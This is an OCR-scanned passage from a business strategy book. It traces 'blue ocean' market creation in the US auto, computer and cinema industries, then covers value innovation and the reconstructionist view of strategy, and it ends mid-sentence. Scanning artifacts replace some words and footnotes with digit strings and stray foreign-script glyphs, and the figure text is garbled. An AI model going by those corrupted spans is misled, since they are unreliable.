Ford’s market share surged from 9\npercent in 1908 to 61 percent in 1921, and by 1923, a majority of American\nhouseholds owned an automobile.° Ford’s Model T exploded the size of the\nautomobile industry, creating a huge blue ocean. So great was the blue\nocean Ford created that the Model T replaced the horse-drawn carriage as\nthe primary means of transport in the United States.\nGeneral Motors\n\nBy 1924, the car had become an essential household item, and the wealth of\nthe average American household had grown. That year, General Motors\n(GM) unveiled a line of automobiles that would create a new blue ocean in\nthe auto industry. In contrast to Ford’s functional, one-color, single-model\nstrategy, GM introduced “a car for every purse and purpose” —a strategy\ndevised by chairman Alfred Sloan to appeal to the emotional dimensions of\nthe US mass market, or what Sloan called the “ mass-class” market.’\n\nWhereas Ford stuck with the functional “horseless carriage” concept of\nthe car, GM made the car fun, exciting, comfortable, and fashionable. GM\nfactories pumped out a broad array of models, with new colors and styles\nupdated every year. The “annual car model” created new demand as buyers\nbegan to trade up for fashion and comfort. Because cars were replaced more\nfrequently, the used car market was also formed.\n\nDemand for GM’s fashionable and emotionally charged cars soared.\nFrom 1926 to 1950, the total number of cars sold in the United States\nincreased from two million to seven million a year, and General Motors\nincreased its overall market share from 20 percent to 50 percent, while\nFord’s fell from 50 percent to 20 percent.®\n\nBut the rapid growth in the US auto industry unleashed by this new blue\nocean could not last forever. Following GM’s surging success, Ford and\nChrysler jumped into the blue ocean GM had created, and the Big Three\npursued the common strategy of launching new car models yearly and\nhitting an emotional chord with consumers by building a wide range of car\nstyles to meet various lifestyles and needs. Slowly, bloody competition\nbegan as the Big Three imitated and matched one another’s strategies.\nCollectively, they captured more than 90 percent of the US auto market.? A\nperiod of complacency set in.\nSmall, Fuel-Efficient Japanese Cars\n\nThe auto industry, however, did not stand still. In the 1970s, the Japanese\ncreated a new blue ocean, challenging the US automobile industry with\nsmall, efficient cars. Instead of following the implicit industry logic “the\nbigger, the better” and focusing on luxuries, the Japanese altered the\nconventional logic, pursuing ruthless quality, small size, and the new utility\nof highly gas-efficient cars.\n\nWhen the oil crisis occurred in the 1970s, US consumers flocked to fuel-\nefficient, robust Japanese cars made by Honda, Toyota, and Nissan (then\ncalled Datsun). Almost overnight the Japanese became heroes in\nconsumers’ minds. Their compact, fuel-efficient cars created a new blue\nocean of opportunity, and again, demand soared. With the Big Three\nfocused on benchmarking and matching one another, none had taken the\ninitiative to produce functional, compact, fuel-efficient cars, even though\nthey did see the market potential for such vehicles. Hence, instead of\ncreating a new blue ocean, the Big Three were dragged into a new round of\ncompetitive benchmarking, only this time with the Japanese; they began to\ninvest heavily in the production of smaller, fuel-efficient vehicles.\n\nNevertheless, the Big Three were still hit by a dive in car sales, with\naggregate losses amounting to $4 billion in 1980.!° Chrysler, the little\nbrother among the Big Three, suffered the hardest hit and narrowly escaped\nbankruptcy by virtue of a government bailout. The Japanese car producers\nhad been so effective at creating and capturing this blue ocean that the US\nautomakers found it hard to make a real comeback; their competitiveness\nand long-run viability were thrown into serious question by industry experts\nacross the world.\nChrysler’s Minivan\n\nFast-forward to 1984. A beleaguered Chrysler, on the edge of bankruptcy,\nunveiled the minivan, creating a new blue ocean in the auto industry. The\nminivan broke the boundary between car and van, creating an entirely new\ntype of vehicle. Smaller than the traditional van and yet more spacious than\nthe station wagon, the minivan was exactly what the nuclear family needed\nto hold the entire family plus its bikes, dogs, and other necessities. And the\nminivan was easier to drive than a truck or van.\n\nBuilt on the Chrysler K car chassis, the minivan drove like a car but\nprovided more interior room and could still fit in the family garage.\nChrysler, however, was not the first to work on this concept. Ford and GM\nhad had the minivan on their drawing boards for years, but they had worried\nthat the design would cannibalize their own station wagons. Undoubtedly\nthey passed a golden opportunity to Chrysler. Within its first year, the\nminivan became Chrysler’s bestselling vehicle, helping the company regain\nits position as one of the Big Three auto manufacturers. Within three years,\nChrysler gained $1.5 billion from the minivan’s introduction alone. '!\n\nThe success of the minivan ignited the sports utility vehicle (SUV) boom\nin the 1990s, which expanded the blue ocean Chrysler had unlocked. Built\non a truck chassis, the SUV continued the progression from car to utility\ntruck. First designed for off-road driving and towing boat trailers, the SUV\nbecame wildly popular with young families for its carlike handling,\nincreased passenger and cargo space over the minivan, and comfortable\ninteriors combined with the increased functionality of four-wheel drive,\ntowing capabilities, and safety. By 1998, total sales of new light trucks\n(minivans, SUVs, and pickups) reached 7.5 million, nearly matching the 8.2\nmillion new car 98169. 12 And by 2005, total sales of new light trucks reached\n9.3 million, going much beyond the 7.7 million sales of new ‏وء‎\n\nIn assessing the US auto industry from its inception until 2005, we see\nthat GM, the Japanese automakers, and Chrysler were established players\nwhen they created blue oceans. For the most part, the blue oceans that were\ncreated were not triggered by technological innovations. Even Ford’s\nrevolutionary assembly line can be traced to the US meatpacking industry. !4\nThe attractiveness of the auto industry was continuously rising and falling\nand rising again, driven, to no small extent, by blue ocean strategic moves.\nThe same is true for the profitable growth trends of companies in the\nindustry. Companies’ profit and growth were linked in no small way to the\nblue oceans they created or failed to create.\n\nAlmost all these companies are remembered for the blue oceans they\nhave created across time. Ford, for example, has suffered significantly at\ntimes, but its brand still stands out largely for the Model T it created some\none hundred years ago.\nThe Computer Industry\n\nLet’s now turn to the computer industry, which supplies a central\ncomponent of work environments across the globe. The US computer\nindustry traces back to 1890, when Herman Hollerith invented the punch\ncard tabulating machine to shorten the process of data recording and\nanalysis for the US census. Hollerith’s tabulator completed the census\ntabulations five years sooner than the preceding census.\n\nSoon after, Hollerith left the census office to form Tabulating Machine\nCompany (TMC), which sold its tabulators to US and foreign government\nagencies. At the time, there was no real market for Hollerith’s tabulators in\nbusiness settings, where data processing was accomplished with pencils and\nledgers that were easy to use, inexpensive, and accurate. Although\nHollerith’s tabulator was very fast and accurate, it was expensive and\ndifficult to use, and it required continuous upkeep. Facing new competition\nafter the expiration of his patent and frustrated after the US government\ndropped TMC due to its steep prices, Hollerith sold the company, which\nwas then merged with two other companies to form CTR in 1911.\nThe Tabulating Machine\n\nIn 1914, CTR’s tabulating business remained small and unprofitable. In an\nattempt to turn the company around, CTR turned to Thomas Watson, a\nformer executive at National Cash Register Company, for help. Watson\nrecognized that there was enormous untapped demand for tabulators to help\nbusinesses improve their inventory and accounting practices. Yet he also\nrealized that the cumbersome new technology was too expensive and\ncomplicated for businesses when their pencils and ledgers worked just fine.\n\nIn a strategic move that would launch the computer industry, Watson\ncombined the strengths of the tabulator with the ease and lower costs of\npencils and ledgers. Under Watson, CTR’s tabulators were simplified and\nmodularized, and the company began to offer on-site maintenance and user\neducation and oversight. Customers would get the speed and efficiency of\nthe tabulator without the need to hire specialists to train employees or\ntechnicians to fix the machines when they broke down.\n\nNext, Watson decreed that tabulators would be leased and not sold, an\ninnovation that helped establish a new pricing model for the tabulating\nmachine business. On the one hand, it allowed businesses to avoid large\ncapital expenditures, while giving them the flexibility to upgrade as\ntabulators improved. On the other hand, it gave CTR a recurring revenue\nstream while precluding customers from buying used machines from one\nanother.\n\nWithin six years, the firm’s revenues more than tripled.15 By the mid-\n1920s, CTR held 85 percent of the tabulating market in the United States. In\n1924, to reflect the company’s growing international presence, Watson\nchanged CTR’s name to International Business Machines Corp. (IBM). The\nblue ocean of tabulators was unlocked.\nThe Electronic Computer\n\nSkip ahead thirty years to 1952. Remington Rand delivered the UNIVAC,\nthe world’s first commercial electronic computer, to the census bureau. Yet\nthat year only three UNIVACs were sold. A blue ocean was not in sight\nuntil IBM’s Watson—this time his son Thomas Watson Jr.—would see the\nuntapped demand in what looked like a small, lackluster market. Watson Jr.\nrealized the role electronic computers could play in business and pushed\nIBM to meet the challenge.\n\nIn 1953, IBM introduced the IBM 650, the first intermediate-sized\ncomputer for business use. Recognizing that if businesses were going to use\nthe electronic computer, they wouldn’t want a complicated machine and\nwould pay only for the computing power they would use, IBM had made\nthe IBM 650 much simpler to use and less powerful than the UNIVAC, and\nit priced the machine at only $200,000, compared with the UNIVAC’s $1\nmillion price tag. As a result, by the end of the 1950s IBM had captured 85\npercent of the business electronic computer market. Revenues almost\ntripled between 1952 and 1959, from $412 million to $1.16 billion. ٤\n\nIBM’s expansion of the blue ocean was greatly accentuated in 1964, with\nthe introduction of the System/360, the first large family of computers to\nuse interchangeable software, peripheral equipment, and service packages.\nIt was a bold departure from the monolithic, one-size-fits-all mainframe.\nLater, in 1969, IBM changed the way computers were sold. Rather than\noffer hardware, services, and software exclusively in packages, IBM\nunbundled the components and offered them for sale individually.\nUnbundling gave birth to the multibillion-dollar software and services\nindustries, with IBM becoming the world’s largest computer services\ncompany.\nThe Personal Computer\n\nThe computer industry continued its evolution through the 1960s and\n\n1970s. IBM, Digital Equipment Corporation (DEC), Sperry, and others that\nhad jumped into the computer industry expanded operations globally and\nimproved and extended product lines to add peripherals and service\nmarkets. Yet in 1978, when the major computer manufacturers were intent\non building bigger, more powerful machines for the business market, Apple\nComputer, Inc., created an entirely new market space with its Apple 11 home\ncomputer.\n\nHowever, contrary to conventional wisdom, the Apple was not the first\npersonal computer on the market. Two years earlier, Micro Instrumentation\nand Telemetry Systems (MITS) had unveiled the Altair 8800. The Altair\nwas released with high expectations in computer hobbyist circles.\nBusinessWeek quickly called MITS the “IBM of home computers.”\n\nYet MITS did not create a blue ocean. Why? The machine had no\nmonitor, no permanent memory, only 256 characters of temporary memory,\nno software, and no keyboard. To enter data, users manipulated switches on\nthe front of the box, and program results were displayed in a pattern of\nflashing lights on the front panel. Unsurprisingly, no one saw much of a\nmarket for such difficult-to-use home computers. Expectations were so low\nthat in that same year Ken Olsen, president of Digital Equipment, famously\nsaid, “There is no reason for any individual to have a computer in their\nhome.”\n\nTwo years later, the Apple II would make Olsen eat his words, creating a\nblue ocean of home computing. Based largely on existing technology, the\nApple II offered a solution with an all-in-one design in a plastic casing,\nincluding the keyboard, power supply, and graphics, that was easy to use.\nThe Apple II came with software ranging from games to businesses\nprograms such as the Apple Writer word processor and the VisiCalc\nspreadsheet, making the computer accessible to the mass of buyers.\n\nApple changed the way people thought about computers. Computers\nwere no longer products for technological “geeks”; they became, like the\nModel T before them, a staple of the American household. Only two years\nafter the birth of the Apple II, Apple sales were more than 200,000 units a\nyear, with Apple placed on the Fortune 500 list three years after going\npublic, an unprecedented feat at the time.17 In 1980 some two dozen firms\nsold 724,000 personal computers, bringing in more than $1.8 billion.'® By\nthe next year, twenty other companies entered the market, and sales doubled\nto 1.4 million units, racking in almost $3 billion.'?\n\nLike a stalking horse, IBM waited out the first couple of years to study\nthe market and the technology and to plan the launch of its home computer.\nIn 1982, IBM dramatically expanded the blue ocean of home computing by\noffering a far more open architecture that allowed other parties to write\nsoftware and develop peripherals. By offering a standardized operating\nsystem for which outsiders could create the software and peripheral\ncomponents, IBM was able to keep its cost and price low while offering\ncustomers greater utility. The company’s scale and scope advantages\nallowed it to price its PC at a level accessible to the mass of buyers.”°\nDuring its first year, IBM sold 200,000 PCs, nearly matching its five-year\nprojection; by 1983 consumers had bought 1.3 million IBM PCs.21\nCompaq PC Servers\n\nWith corporations across the United States buying and installing PCs\nthroughout their organizations, there was a growing need to connect PCs for\nsimple but important tasks such as sharing files and printers. The business\ncomputer industry spawned by the IBM 650—and jumped into by HP,\nDEC, and Sequent, to name a few—offered high-end enterprise systems to\nrun corporations’ critical missions, as well as numerous operating systems\nand application software. But these machines were too expensive and\ncomplex to justify handling simple but important needs such as file and\nprinter sharing. This was especially true in small to midsize companies that\nneeded to share printers and files but did not yet require the huge\ninvestment of a complex minicomputer architecture.\n\nIn 1992, Compaq changed all that by effectively creating the blue ocean\nof the PC server industry with its launch of the ProSignia, a radically\nsimplified server that was optimized for the most commonly used functions\nof file and printer sharing. It eliminated interoperability with a host of\noperating systems, ranging from SCO UNIX to OS/3 to DOS, which were\nextraneous to these basic functions. The new PC server gave buyers twice a\nminicomputer’s file and print sharing capability and speed at one-third the\nprice. As for Compagq, the dramatically simplified machines translated into\nmuch lower manufacturing costs. Compaq’s creation of the ProSignia, and\nthree subsequent offerings in the PC server industry, not only fueled PC\nsales but also grew the PC server industry into a $3.8 billion industry in less\nthan four years.22\nDell Computer\n\nIn the mid-1990s, Dell Computer Corporation created another blue ocean in\nthe computer industry. Traditionally, computer manufacturers competed on\noffering faster computers having more features and software. Dell,\nhowever, challenged this industry logic by changing the purchasing and\ndelivery experiences of buyers. With its direct sales to customers, Dell was\nable to sell its PCs for 40 percent less than IBM dealers while still making\nmoney.\n\nDirect sales further appealed to customers because Dell offered\nunprecedented delivery time. For example, the time it took from order to\ncustomer delivery at Dell was four days, compared with its competitors’\naverage of more than ten weeks. Moreover, through Dell’s online and\ntelephone ordering system, customers were given the option to customize\ntheir machines to their liking. In the meantime, the built-to-order model\nallowed Dell to significantly reduce inventory costs.\n\nWith Dell’s blue ocean, it became the undisputed market leader in PC\nsales. Its revenues skyrocketed from $5.3 billion in 1995 to $43 billion in\n2006.73 Since then, new blue oceans have continued to be created in the\ncomputer industry, from the tablet with Apple’s iPad to cloud computing\nservices, leapfrogging Dell. To remain relevant, Dell’s challenge is to create\na new blue ocean to capture the imagination and wallets of buyers again.\nWithout this, it will be hard for Dell to get out of the red ocean of bloody\ncompetition it now finds itself in.\n\nAs with the auto industry, the blue oceans in the computer industry have\nnot been unleashed by technology innovations per se but by linking\ntechnology to elements valued by buyers. As in the case of the IBM 650 and\nthe Compaq PC server, the value innovation often rested on simplifying the\ntechnology. We also see industry incumbents—CTR, IBM, Compaq—\nlaunching blue oceans as much as we see new entrants, such as Apple and\nDell. Each blue ocean has gone a long way to enhance the originating\ncompany’s brand name and has led to a surge not only in its profitable\ngrowth but in the profitable growth of the computer industry overall.\nThe Movie Theater Industry\n\nNow let’s turn to the movie theater industry, which offers a way for many of\nus to relax after work or on weekends. The US movie theater industry can\nbe traced back to 1893, when Thomas Edison unveiled the Kinetoscope, a\nwooden cabinet inside which light was projected through a reel of film.\nViewers saw the action through a peephole one at a time, and the\nperformance was called a “peep show.”\n\nTwo years later, Edison’s staff developed a projecting kinetoscope, which\nshowed motion pictures on a screen. The projecting kinetoscope, however,\ndid not take off in any meaningful way. The clips, each several minutes\nlong, were introduced between vaudeville acts and at theaters. The aim was\nto lift the value of live entertainment performances, the focus of the theater\nindustry, rather than to provide a discrete entertainment form. The\ntechnology was there for the movie theater industry to ignite, but the idea to\ncreate a blue ocean had not yet been planted.\nNickelodeons\n\nHarry Davis changed all that by opening his first nickelodeon theater in\nPittsburgh, Pennsylvania, in 1905. The nickelodeon is widely credited with\nlaunching the movie theater industry in the United States, creating a huge\nblue ocean. Consider the differences. Although most Americans belonged to\nthe working class at the beginning of the twentieth century, the theater\nindustry until then concentrated on offering live entertainment, such as\ntheater, operas, and vaudeville, to the social elite.\n\nWith the average family earning only $12 a week, live entertainment\nsimply wasn’t an option. It was too expensive. Average ticket prices for an\nopera were $2, and vaudeville was 50 cents. For the majority, theater was\ntoo serious. With little education, the theater or opera just wasn’t appealing\nto the working class. It was also inconvenient. Productions played only a\nfew times a week, and with most theaters located in the well-heeled parts of\nthe city, they were difficult to get to for the mass of working-class people.\nWhen it came to entertainment, most Americans were left in the dark.\n\nIn contrast, the price of admission to Davis’s nickelodeon theater was 5\ncents (thus explaining the name). Davis kept the price at a nickel by\nstripping the theater venue to its bare essentials—benches and the screen—\nand placing his theaters in lower-rent, working-class neighborhoods. Next\nhe focused on volume and convenience, opening his theaters at eight in the\nmorning and playing reels continuously until midnight. The nickelodeons\nwere fun, playing slapstick comedies accessible to most people regardless\nof their education, language, or age.\n\nWorking-class people flocked to nickelodeons, which entertained some\nseven thousand customers per day. In 1907 the Saturday Evening Post\nreported that daily attendance at nickelodeons exceeded two 11711101124 Soon\nnickelodeons set up shop across the country. By 1914 the United States had\neighteen thousand nickelodeons, with seven million daily admissions.”> The\nblue ocean had grown into a $3 billion industry in today’s dollar terms.\nThe Palace Theaters\n\nAs the nickelodeon’s blue ocean reached its peak, in 1914 Samuel “Roxy”\nRothapfel set out to bring the appeal of motion pictures to the emerging\nmiddle and upper classes by opening the country’s first Palace Theater in\nNew York City. Until that point, Rothapfel had owned a number of\nnickelodeons in the United States and was best known for turning around\nstruggling theaters across the country. Unlike nickelodeons, which were\nconsidered lowbrow and simplistic, Rothapfel’s Palace Theaters were\nelaborate affairs, with extravagant chandeliers, mirrored hallways, and\ngrand entranceways. With valet parking, plush “love seats,” and longer\nfilms with theatrical plots, these theaters made going to the movies an event\nworthy of theater-or operagoers, but at an affordable price.\n\nThe picture palaces were a commercial success. Between 1914 and 1922,\nfour thousand new Palace Theaters opened in the United States.\nMoviegoing became an increasingly important entertainment event for\nAmericans of all economic levels. As Roxy pointed out, “Giving the people\nwhat they want is fundamentally and disastrously wrong. The people don’t\nknow what they want . . . [Give] them something better.” Palace Theaters\neffectively combined the viewing environment of opera houses with the\nviewing contents of nickelodeons—films—to unlock a new blue ocean in\nthe cinema industry and attract a whole new mass of moviegoers: the upper\nand middle ء1٥۹6‎\n\nAs the wealth of the nation increased and Americans headed for the\nsuburbs to fulfill the dream of a house with a picket fence, a chicken in\nevery pot, and a car in every garage, the limitations of further growth in the\nPalace Theater concept began to be felt in the late 1940s. Suburbs, unlike\nmajor cities or metropolitan areas, could not support the large size and\nopulent interiors of the Palace Theater concept. The result of competitive\nevolution was the emergence of small theaters in suburban locations\nrunning one movie per week. Although the small theaters were “cost\nleaders” compared with Palace Theaters, they failed to capture people’s\nimaginations. They gave people no special feeling of a night out, and their\nsuccess depended solely on the quality of the film being played. If a film\nwas unsuccessful, customers saw no reason to come, and the theater owner\nlost money. With the industry increasingly taking on a has-been status, its\nprofitable growth was flagging.\nThe Multiplex\n\nYet, once again, the industry was set on a new profitable growth trajectory\nthrough the creation of a new blue ocean. In 1963, Stan Durwood undertook\na strategic move that turned the industry on its head. Durwood’s father had\nopened his family’s first movie theater in Kansas City in the 1920s, and\nStan Durwood revitalized the movie theater industry with the creation of the\nfirst multiplex in a Kansas City shopping center.\n\nThe multiplex was an instant hit. On the one hand, the multiplex gave\nviewers a greater choice of films; on the other, with different-sized theaters\nin one place, theater owners could make adjustments to meet varying\ndemands for movies, thereby spreading their risk and keeping costs down.\nAs aresult, Durwood’s company, American Multi-Cinema, Inc. (AMC),\ngrew from a small-town theater to become the second-largest movie\ncompany in the nation, as the blue ocean of the multiplex spread across\nAmerica.\nThe Megaplex\n\nThe launch of the multiplex created a blue ocean of new profitable growth\nin the industry, but by the 1980s the spread of videocassette recorders and\nsatellite and cable television had reduced movie attendance. To make\nmatters worse, in an attempt to capture a greater share of a shrinking\nmarket, theater owners split their theaters into smaller and smaller viewing\nrooms so that they could show more features. Unwittingly, they undermined\none of the industry’s distinctive strengths over home entertainment: large\nscreens. With first-run movies available on cable and videocassette only\nweeks after release, the benefit of paying more money to see movies on a\nslightly larger screen was marginal. The movie theater industry fell into a\nsteep decline.\n\nIn 1995, AMC again re-created the movie theater industry by introducing\nthe first twenty-four-screen megaplex in the United States. Unlike the\nmultiplexes, which were often cramped, dingy, and unspectacular, the\nmegaplex had stadium seating (for unobstructed views) and comfortable\neasy chairs, and it offered more films and superior sight and sound. Despite\nthese improved offerings, the megaplex’s operating costs are still lower than\nthe multiplex’s. This is because the megaplex’s location outside city centers\n—the key cost factor—is much cheaper; its size gives it economies in\npurchasing and operations and more leverage with film distributors. And\nwith twenty-four screens playing every available movie on the market, the\nplace, and not the movie, becomes the draw.\n\nIn the late 1990s, average per-customer revenues at AMC megaplexes\nwere 8.8 percent above those of the average multiplex theater. The cinema\nclearance zones of movie theaters—the radius of the area from which\npeople will come to the cinema—jumped from two miles in the mid-1990s\nto five miles for AMC’s megaplex.*’ Between 1995 and 2001, overall\nmotion picture attendance grew from 1.26 billion to 1.49 billion.\nMegaplexes constituted only 15 percent of US movie screens, but they\naccounted for 38 percent of all box-office revenues.\n\nThe success of the blue ocean created by AMC caused other industry\nplayers to imitate it. Too many megaplexes were built in too short a time,\nhowever, and many of them had closed by 2000 because of a slowing\neconomy. Again the industry is ripe for a new blue ocean to be created.\nPeople love to go out and generally enjoy being entertained. With the\nincreasing prevalence of easily downloadable films from the likes of\nNetflix, iTunes, and Amazon, the pressure is on for movie theaters to once\nagain reinvent themselves to recapture people’s love for an enjoyable\nentertainment experience.\n\nThis is only a sketch of the American movie theater industry, but the\nsame general patterns appear as in the other examples. This has not been a\nperpetually attractive industry. There has not been a perpetually excellent\ncompany. The creation of blue oceans has been a key driving factor in a\ncompany’s and the industry’s profitable growth trajectory, with blue oceans\nbeing created here mainly by incumbents such as AMC and Palace\nTheaters. As history reveals, AMC created a blue ocean in the US movie\ntheater industry first with the multiplex and then with megaplex, twice\nresetting the course of development for the entire industry and twice\nbringing its own profitability and growth to a new level. At the heart of\nthese blue oceans was not technology innovation per se but value-driven\ninnovation, what we call value innovation.\n\nLooking across the sketches of these three industries, we find that whether\nor not a company can attain sustained profitable growth depends largely on\nwhether it can continuously stay in the forefront during consecutive rounds\nof blue ocean creation. Lasting excellence has scarcely been achievable for\nany company; to date, no company has been able to lead journeys into blue\noceans continuously over the long run. However, companies with powerful\nnames are often those that have been capable of reinventing themselves by\nrepeatedly creating new market space. In this sense, there have been no\nperpetually excellent companies up until now, but companies can hope to\nmaintain excellence by adhering to excellent strategic practice. With\nmarginal deviations, the pattern of blue ocean creation exemplified by these\nthree representative industries is consistent with what we observed in the\nother industries in our study. By articulating the logic of blue ocean strategy\nand providing systematic tools and frameworks to act on, this book aims to\nhelp alter business history by making the creation of blue oceans a\nsystematic process that is repeatable.\nAPPENDIX B\n\nValue Innovation\n\nA Reconstructionist View of Strategy\n\nTHERE ARE BASICALLY TWO DISTINCT VIEWS on how industry structure is\nrelated to strategic actions of industrial players.\n\nThe structuralist view of strategy has its roots in industrial organization\n(IO) economics.! The model of industrial organization analysis proposes a\nstructure-conduct-performance paradigm, which suggests a causal flow\nfrom market structure to conduct and performance. Market structure, given\nby supply and demand conditions, shapes sellers’ and buyers’ conduct,\nwhich, in turn, determines end performance.” Systemwide changes are\ninduced by factors that are external to the market structure, such as\nfundamental changes in basic economic conditions and technological\nbreakthroughs.*\n\nThe reconstructionist view of strategy, on the other hand, is built on the\ntheory of endogenous growth. The theory traces back to Joseph A.\nSchumpeter’s initial observation that the forces that change economic\nstructure and industry landscapes can come from within the system.4\nSchumpeter argues that innovation can happen endogenously and that its\nmain source is the creative entrepreneur. Schumpeterian innovation is still\nblack-boxed, however, because it is the product of the ingenuity of\nentrepreneurs and cannot be reproduced systematically. Schumpeterian\ninnovation also assumes destruction in that it sees the new incessantly\ndestroying the old.\n\nMore recently, the new growth theory made advances on this front by\nshowing that innovation can be replicable endogenously via an\nunderstanding of the patterns or recipes behind innovation.° In essence, this\ntheoretical advancement separated the recipe for innovation—or the pattern\nof knowledge and ideas behind it—from Schumpeter’s lone entrepreneur,\nopening the way for the systematic reproduction of innovation. However,\ndespite this important advance, we still lack an understanding of what those\nrecipes or patterns are. Absent this, knowledge and ideas cannot be\ndeployed in action to produce innovation and growth at the firm level.\n\nThe reconstructionist view takes off where the new growth theory left\noff. Building on the new growth theory, the reconstructionist view suggests\nhow knowledge and ideas are deployed in the process of creation to\nproduce endogenous growth for the firm. In particular, it proposes that such\na process of creation can occur in any organization at any time by the\ncognitive reconstruction of existing data and market elements in a\nfundamentally new way.\n\nThese two views—the structuralist and the reconstructionist—have\nimportant implications for how companies act on strategy. The structuralist\nview (or environmental determinism) often leads to competition-based\nstrategic thinking. Taking market structure as given, it drives companies to\ntry to carve out a defensible position against the competition in the existing\nmarket space. To sustain themselves in the marketplace, practitioners of\nstrategy focus on building advantages over the competition, usually by\nassessing what competitors do and striving to do it better. Here, grabbing a\nbigger share of the market is seen as a zero-sum game in which one\ncompany’s gain is achieved at another company’s loss. Hence, competition,\nthe supply side of the equation, becomes the defining variable of strategy.\n\nSuch strategic thinking leads firms to divide industries into attractive and\nunattractive ones and to decide accordingly whether or not to enter. After it\nis in an industry, a firm chooses a distinctive cost or differentiation position\nthat best matches its internal systems and capabilities to counter the\ncompetition.’ Here, cost and value are seen as trade-offs. Because the total\nprofit level of the industry is also determined exogenously by structural\nfactors, firms principally seek to capture and redistribute wealth instead of\ncreating wealth. They focus on dividing up the red ocean, where growth is\nincreasingly limited.\n\nTo reconstructionist eyes, however, the strategic challenge looks very\ndifferent. Recognizing that structure and market boundaries exist only in\nmanagers’ minds, practitioners who hold this view do not let existing\nmarket structures limit their thinking. To them, extra demand is out there,\nlargely untapped. The crux of the problem is how to create it. This, in turn,\nrequires a shift of attention from supply to demand, from a focus on\ncompeting to a focus on value innovation—that is, the creation of\ninnovative value to unlock new demand. With this new focus in mind, firms\ncan hope to accomplish the journey of discovery by looking systematically\nacross established boundaries of competition and reordering existing\nelements in different markets to reconstruct them into a new market space\nwhere a new level of demand is generated.®\n\nIn the reconstructionist view, there is scarcely any attractive or\nunattractive industry per se because the level of industry attractiveness can\nbe altered through companies’ conscientious efforts of reconstruction. As\nmarket structure is changed in the reconstruction process, so are best-\npractice rules of the game. Competition in the old game is therefore\nrendered irrelevant. By stimulating the demand side of the economy, the\nstrategy of value innovation expands existing markets and creates new ones.\nValue innovators achieve a leap in value by creating new wealth rather than\nnecessarily at the expense of competitors in the traditional sense. In this\nway, value innovation goes beyond creative destruction that displaces and,\nhence, destructs the players in existing markets. It also brings\nnondestructive creation through which it either expands the existing market\nboundaries or creates new market spaces. Such a strategy therefore allows\nfirms to largely play a non— zero-sum game, with high payoff possibilities.\n\nHow, then, does reconstruction, such as what we see in Cirque du Soleil,\ndiffer from the “combination” and “recombination” that have been\ndiscussed in the innovation literature?” Schumpeter, for example, sees\ninnovation as a “new combination of productive means.”\n\nWe have seen in the example of Cirque du Soleil a focus on the demand\nside, whereas recombination is about recombining existing technologies or\nproductive means, often focusing on the supply side. The basic building\nblocks for reconstruction are buyer value elements that reside across\nexisting industry boundaries. They are not technologies nor methods of\nproduction.\n\nBy focusing on the supply side, recombination tends to seek an\ninnovative solution to the existing problem, which, when achieved, leads to\ndisplacement and hence creative destruction. Looking at the demand side,\nin contrast, reconstruction breaks away from the cognitive bounds set by the\nexisting rules of competition. It focuses on redefining the existing problem\nitself, which tends to produce creative destruction along with\nnondestructive creation.!° Cirque du Soleil, for example, is not about\noffering a better circus by recombining existing knowledge or technologies\nabout acts and performances. Rather, it is about reconstructing existing\nbuyer value elements to create a new form of entertainment that offers the\nfun and thrill of the circus with the intellectual sophistication of the theater.\n\nReconstruction reshapes the boundary and the structure of an industry\nand creates a blue ocean of new market space. Recombination, on the other\nhand, tends to maximize technological possibilities to discover innovative\nsolutions to a given and known problem. !!\nAPPENDIX C\n\nThe Market Dynamics of Value Innovation\n\nTHE MARKET DYNAMICS OF VALUE INNOVATION stand in stark contrast with\nthe conventional practice of technology innovation. The latter typically sets\nhigh prices, limits access, and initially engages in price skimming to earn a\npremium on the innovation and only later focuses on lowering prices and\ncosts to retain market share and discourage imitators.\n\nHowever, in a world of nonrival and nonexcludable goods, such as\nknowledge and ideas that are imbued with the potential of economies of\nscale, learning, and increasing returns, the importance of volume, price, and\ncost grows in an unprecedented way.! Under these conditions, companies\nwould do well to capture the mass of target buyers from the outset and\nexpand the size of the market by offering radically superior value at price\npoints accessible to them.\n\nAs shown in figure C-1, value innovation radically increases the appeal of\na good, shifting the demand curve from D1 to D2. The price is set\nstrategically and, as with the Swatch example, is shifted from P1 to P2 to\ncapture the mass of buyers in the expanded market. This increases the\nquantity sold from Q1 to Q2 and builds strong brand recognition, for\nunprecedented value.\n\nFIGURE C-1\n\nThe market dynamics of value innovation\nP1| 气 ------ 、\n\n________ Long-run average cost curve\n\nPrice\n\nQuantity\n\nThe company, however, engages in target costing to simultaneously\nreduce the long-run average cost curve from LRAC1 to LRAC2 to expand\nits ability to profit and to discourage free riding and imitation. Hence, buyers\nreceive a leap in value, shifting the consumer surplus from axb to eyf. And\nthe company earns a leap in profit and growth, shifting the profit zone from\nabcd to efgh.\n\nThe rapid brand recognition built by the company as a result of the\nunprecedented value offered in the marketplace, combined with the\nsimultaneous drive to lower costs, makes the competition nearly irrelevant\nand makes it hard to catch up, as economies of scale, learning, and\n\nincreasing returns kick in.” What follows is the emergence of win-win\n\nmarket dynamics, where companies earn dominant positions while buyers\nalso come out big winners.\n\nTraditionally, firms with monopolistic positions have been associated with\ntwo social welfare loss activities. First, to maximize their profits, companies\nset prices high. This prohibits those customers who, although desiring the\nproduct, cannot afford to buy it. Second, lacking viable competition, firms\nwith monopolistic positions often do not focus on efficiency and cost\nreduction and hence consume more scarce resources. As figure C-2 shows,\nunder conventional monopolistic practice, the price level is raised from 1\nunder perfect competition to P2 under monopoly. Consequently, demand\ndrops from Q1 to ৫2. At this level of demand, the monopolist increases its\nprofits by the area R, as opposed to the situation of perfect competition.\nBecause of the artificially high price imposed on consumers, the consumer\nsurplus decreases from area C+R+D to area C. Meanwhile, the monopolistic\npractice, by consuming more of the society’s resources, also incurs a\ndeadweight loss of area D for the society at large. Monopolistic profits,\ntherefore, are achieved at the expense of consumers and society at large.\n\nFIGURE C-2\n\nFrom perfect competition to monopolist practice\nPrice: Increases from P1 to 2\n\nDemand: Decreases from Q1 to Q2\n\n0০ Consumer surplus: Decreases from\nC+R+Dtoc\nP2 ٤-حق‎ 1 Profit: Increases by R for the monopolist\n1\nR । D Deadweight loss to the society caused\n… by monopolist practice: D\nP1 F------------- 1 一 一 一 一 一 一 一 一 心\n\nDemand\n\nرہم بے حم ہک52\n\nBlue ocean strategy, on the other hand, works against this sort of price\nskimming, which is common to traditional monopolists. The focus of blue\nocean strategy is not on restricting output at a high price but rather on\ncreating new aggregate demand through a leap in buyer value at an\naccessible price. This creates a strong incentive not only to reduce costs to\nthe lowest possible level at the start but also to keep it that way over time to\ndiscourage potential free-riding imitators. In this way, buyers win and the\nsociety benefits from improved efficiency. This creates a win-win scenario.\nA breakthrough in value is achieved for 